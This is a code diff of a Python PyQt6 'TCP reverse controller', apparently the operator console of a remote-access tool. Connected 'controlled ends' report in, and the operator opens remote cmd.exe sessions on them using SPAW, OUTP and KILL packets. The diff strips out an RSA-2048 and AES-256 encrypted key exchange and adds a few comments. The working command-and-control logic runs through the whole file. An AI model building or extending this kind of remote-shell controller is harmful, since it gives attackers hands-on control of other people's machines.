@@ -7,31 +7,6 @@ from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QH
                              QMenu, QAbstractItemView)
 from PyQt6.QtCore import Qt, QAbstractListModel, QVariant, QModelIndex, pyqtSignal, QObject, pyqtSlot
 import struct
-import os
-
-from cryptography.hazmat.primitives.asymmetric import rsa, padding
-from cryptography.hazmat.primitives import serialization, hashes
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.primitives import padding as sym_padding
-
-
-def generate_rsa_keypair(bits: int = 2048):
-    """生成 RSA-2048 密钥对，公钥指数 e=65537"""
-    return rsa.generate_private_key(public_exponent=65537, key_size=bits)
-
-
-def rsa_pubkey_to_capi_blob(private_key) -> bytes:
-    """转换为 Windows CAPI 兼容的 PUBLICKEYBLOB 格式"""
-    pub = private_key.public_key()
-    numbers = pub.public_numbers()
-    bitlen = numbers.n.bit_length()
-
-    blob_header = struct.pack('<BBHI', 0x06, 0x02, 0x0000, 0x0000A400)
-    magic = 0x31415352  # 'RSA1' 小端
-    rsa_pubkey = struct.pack('<III', magic, bitlen, numbers.e)
-    modulus = numbers.n.to_bytes(bitlen // 8, byteorder='little')
-
-    return blob_header + rsa_pubkey + modulus
 
 
 class ClientSignals(QObject):
@@ -48,35 +23,22 @@ class ClientSession:
         self.connected = True
         self._recv_buf = bytearray()
         self.signals = ClientSignals()
-        self.aes_key: bytes | None = None
-
-        self.conn.settimeout(15.0)
 
     def send_packet(self, body: bytes) -> bool:
-        """AES-256-CBC 加密发送"""
-        if not self.connected or self.aes_key is None:
+        if not self.connected:
             return False
         try:
-            iv = os.urandom(16)
-            cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(iv))
-            encryptor = cipher.encryptor()
-
-            padder = sym_padding.PKCS7(128).padder()
-            padded_body = padder.update(body) + padder.finalize()
-
-            ciphertext = encryptor.update(padded_body) + encryptor.finalize()
-
-            payload = iv + ciphertext
-            header = struct.pack('>I', len(payload))
-            self.conn.sendall(header + payload)
+            body_len = len(body)
+            header = struct.pack(">I", body_len)
+            packet = header + body
+            self.conn.sendall(packet)
             return True
-        except (OSError, BrokenPipeError, ValueError):
+        except (OSError, BrokenPipeError):
             self.close()
             return False
 
     def close(self):
         self.connected = False
-        self.aes_key = None
         try:
             self.conn.close()
         except Exception:
@@ -104,7 +66,7 @@ class RemoteCmdDialog(QDialog):
         input_lay.addWidget(self.cmd_input)
         lay.addLayout(input_lay)
 
-        self.out_box.append(f"==== 连接 {self.client.ip_str} 远程CMD ====\n[*] 已发送 SPAW 启动被控端 cmd.exe")
+        self.out_box.append(f"==== 连接 {self.client.ip_str} 远程CMD ====\n[*] 已发送SPAW启动被控端cmd.exe")
         self.client.send_packet(b"SPAW")
 
     @pyqtSlot(str)
@@ -125,8 +87,10 @@ class RemoteCmdDialog(QDialog):
 
     def closeEvent(self, event):
         self.is_alive = False
+        # 关闭时发送KILL
         if self.client.connected:
             self.client.send_packet(b"KILL")
+        # 主动从主窗口字典中移除自己，避免第二次打开复用旧窗口
         if self.main_window and self.client in self.main_window.open_cmd_dialogs:
             del self.main_window.open_cmd_dialogs[self.client]
         super().closeEvent(event)
@@ -161,12 +125,10 @@ class ClientListModel(QAbstractListModel):
 class MainWindow(QMainWindow):
     def __init__(self):
         super().__init__()
-        self.setWindowTitle("TCP反向控制端 (RSA-2048 + AES-256加密)")
+        self.setWindowTitle("TCP反向控制端")
         self.resize(700, 500)
         self.server_sock: socket.socket | None = None
         self.server_running = False
-        self.server_rsa_key = None
-        self.server_rsa_raw: bytes | None = None
         self.client_model = ClientListModel()
         self.open_cmd_dialogs: dict[ClientSession, RemoteCmdDialog] = {}
 
@@ -210,75 +172,27 @@ class MainWindow(QMainWindow):
                 sess.signals.on_disconnect.connect(self.handle_session_disconnect)
                 self.client_model.add(sess)
                 self.log(f"新被控端接入 {sess.ip_str}")
-                threading.Thread(target=self.client_recv_loop, args=(sess,), daemon=True).start()
+                t = threading.Thread(target=self.client_recv_loop, args=(sess,), daemon=True)
+                t.start()
             except OSError:
                 break
 
     @pyqtSlot(object, str)
     def handle_session_outp(self, sess: ClientSession, text: str):
         if sess in self.open_cmd_dialogs:
-            self.open_cmd_dialogs[sess].append_text(text)
+            dlg = self.open_cmd_dialogs[sess]
+            dlg.append_text(text)
 
     @pyqtSlot(object)
     def handle_session_disconnect(self, sess: ClientSession):
         if sess in self.open_cmd_dialogs:
             dlg = self.open_cmd_dialogs.pop(sess)
-            dlg.append_text("\n[!] TCP 连接已经断开")
+            dlg.append_text("\n[!] TCP连接已经断开")
         self.client_model.remove_by_obj(sess)
         self.log(f"被控端断开 {sess.ip_str}")
 
     def client_recv_loop(self, sess: ClientSession):
         buf = sess._recv_buf
-
-        if not self.server_rsa_raw:
-            sess.close()
-            sess.signals.on_disconnect.emit(sess)
-            return
-
-        server_rsa_key = serialization.load_pem_private_key(
-            self.server_rsa_raw,
-            password=None
-        )
-
-        pub_blob = rsa_pubkey_to_capi_blob(server_rsa_key)
-        try:
-            sess.conn.sendall(pub_blob)
-        except OSError:
-            sess.close()
-            sess.signals.on_disconnect.emit(sess)
-            return
-
-        encrypted_aes = b''
-        while len(encrypted_aes) < 256:
-            try:
-                chunk = sess.conn.recv(256 - len(encrypted_aes))
-                if not chunk:
-                    break
-                encrypted_aes += chunk
-            except (OSError, socket.timeout):
-                break
-
-        if len(encrypted_aes) != 256:
-            sess.close()
-            sess.signals.on_disconnect.emit(sess)
-            return
-
-        try:
-            aes_key = server_rsa_key.decrypt(
-                encrypted_aes,
-                padding.PKCS1v15()
-            )
-        except Exception:
-            aes_key = None
-
-        if aes_key is None or len(aes_key) != 32:
-            sess.close()
-            sess.signals.on_disconnect.emit(sess)
-            return
-
-        sess.aes_key = aes_key
-        self.log(f"与 {sess.ip_str} 完成密钥交换，加密通信已建立")
-
         while sess.connected:
             try:
                 chunk = sess.conn.recv(4096)
@@ -295,51 +209,23 @@ class MainWindow(QMainWindow):
                     body = buf[4:total_packet_len]
                     del buf[:total_packet_len]
 
-                    if len(body) < 16:
-                        continue
-
-                    iv = body[:16]
-                    ciphertext = body[16:]
-
-                    try:
-                        cipher_aes = Cipher(algorithms.AES(sess.aes_key), modes.CBC(iv))
-                        decryptor = cipher_aes.decryptor()
-                        decrypted = decryptor.update(ciphertext) + decryptor.finalize()
-
-                        unpadder = sym_padding.PKCS7(128).unpadder()
-                        plaintext = unpadder.update(decrypted) + unpadder.finalize()
-                    except Exception:
-                        continue
-
-                    if len(plaintext) >= 4:
-                        cmd_code = plaintext[0:4]
+                    if len(body)>=4:
+                        cmd_code = body[0:4]
                         if cmd_code == b"PONG":
                             sess.last_pong = datetime.now()
                             self.client_model.dataChanged.emit(QModelIndex(), QModelIndex())
                         elif cmd_code == b"OUTP":
-                            output_bytes = plaintext[4:]
+                            output_bytes = body[4:]
                             out_text = output_bytes.decode("gbk", errors="replace")
                             sess.signals.on_outp.emit(sess, out_text)
 
-            except (OSError, socket.timeout):
+            except OSError:
                 break
-
         sess.close()
         sess.signals.on_disconnect.emit(sess)
 
     def start_server(self):
         port = int(self.port_edit.text())
-        self.log("正在生成 RSA-2048 密钥对...")
-        self.server_rsa_key = generate_rsa_keypair(2048)
-
-        self.server_rsa_raw = self.server_rsa_key.private_bytes(
-            encoding=serialization.Encoding.PEM,
-            format=serialization.PrivateFormat.PKCS8,
-            encryption_algorithm=serialization.NoEncryption()
-        )
-
-        self.log("RSA 密钥对生成完成，采用 RSA-2048 + AES-256-CBC 加密")
-
         self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.server_sock.bind(("0.0.0.0", port))
@@ -360,8 +246,6 @@ class MainWindow(QMainWindow):
         for s in self.client_model.items:
             s.close()
         self.open_cmd_dialogs.clear()
-        self.server_rsa_key = None
-        self.server_rsa_raw = None
         self.btn_start.setEnabled(True)
         self.btn_stop.setEnabled(False)
         self.log("停止监听")
@@ -372,9 +256,10 @@ class MainWindow(QMainWindow):
             return
         sess: ClientSession = self.client_model.items[idx.row()]
         menu = QMenu()
-        act_open_cmd = menu.addAction("打开远程 CMD 会话")
+        act_open_cmd = menu.addAction("打开远程CMD会话")
         ret = menu.exec(self.view.viewport().mapToGlobal(pos))
         if ret == act_open_cmd:
+            # 修复：检查旧对话框是否还存活
             if sess in self.open_cmd_dialogs:
                 dlg = self.open_cmd_dialogs[sess]
                 if dlg.isVisible():
@@ -382,7 +267,9 @@ class MainWindow(QMainWindow):
                     dlg.activateWindow()
                     return
                 else:
+                    # 旧对话框已关闭，清理字典
                     del self.open_cmd_dialogs[sess]
+            # 创建全新对话框
             dlg = RemoteCmdDialog(sess, parent=self)
             self.open_cmd_dialogs[sess] = dlg
             dlg.show()
